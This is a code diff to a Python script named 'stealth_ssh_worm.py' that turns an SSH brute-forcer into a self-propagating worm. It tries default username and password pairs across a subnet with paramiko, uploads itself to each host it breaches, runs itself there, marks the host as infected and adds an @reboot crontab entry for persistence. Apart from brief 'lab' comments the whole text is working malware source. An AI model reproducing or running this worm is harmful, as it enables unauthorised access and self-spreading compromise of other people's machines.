@@ -2,37 +2,69 @@ import paramiko
 import socket
 import os
 import sys
-from multiprocessing import Pool
+import threading
+from time import sleep
 
-# Set your username and password guesses here
-USERNAMES = ["root", "admin"]
-PASSWORDS = ["toor", "admin", "123456"]
-SUBNET = "192.168.56."  # Change to your lab subnet (e.g., 192.168.1.)
+# Config
+USERNAMES = ["admin", "root"]
+PASSWORDS = ["admin", "toor", "123456"]
+SUBNET = "192.168.56."
+RANGE = range(101, 111)  # Adjust for your lab
+WORM_NAME = "stealth_ssh_worm.py"
+INFECTION_MARKER = "/tmp/.infected"
 
-SELF = sys.argv[0]
+SELF = os.path.abspath(sys.argv[0])
+lock = threading.Lock()
+
+def is_infected_system():
+    return os.path.exists(INFECTION_MARKER)
+
+def mark_infected():
+    with open(INFECTION_MARKER, 'w') as f:
+        f.write("Infected\n")
+
+def persist():
+    cron_job = f"@reboot python3 /tmp/{WORM_NAME}\n"
+    os.system(f'(crontab -l 2>/dev/null; echo "{cron_job}") | crontab -')
 
 def try_ssh(ip):
-    for user in USERNAMES:
-        for pwd in PASSWORDS:
+    for username in USERNAMES:
+        for password in PASSWORDS:
             try:
                 ssh = paramiko.SSHClient()
                 ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-                ssh.connect(ip, username=user, password=pwd, timeout=3)
-                print(f"[+] Infected {ip} with {user}:{pwd}")
+                ssh.connect(ip, username=username, password=password, timeout=3)
+                print(f"[+] Infected {ip} via {username}:{password}")
 
                 sftp = ssh.open_sftp()
-                sftp.put(SELF, "/tmp/worm.py")
-                ssh.exec_command("python3 /tmp/worm.py &")
+                sftp.put(SELF, f"/tmp/{WORM_NAME}")
+                ssh.exec_command(f"python3 /tmp/{WORM_NAME} &")
                 sftp.close()
                 ssh.close()
                 return
-            except (paramiko.ssh_exception.SSHException, socket.error):
+            except:
                 continue
 
+def scan_and_infect():
+    threads = []
+    for i in RANGE:
+        ip = f"{SUBNET}{i}"
+        t = threading.Thread(target=try_ssh, args=(ip,))
+        threads.append(t)
+        t.start()
+        sleep(0.1)  # Avoid flooding the network
+
+    for t in threads:
+        t.join()
+
 def main():
-    pool = Pool(processes=20)
-    targets = [f"{SUBNET}{i}" for i in range(1, 255)]
-    pool.map(try_ssh, targets)
+    if is_infected_system():
+        return
+
+    print("[*] Infecting system...")
+    mark_infected()
+    persist()
+    scan_and_infect()
 
 if __name__ == "__main__":
     main()
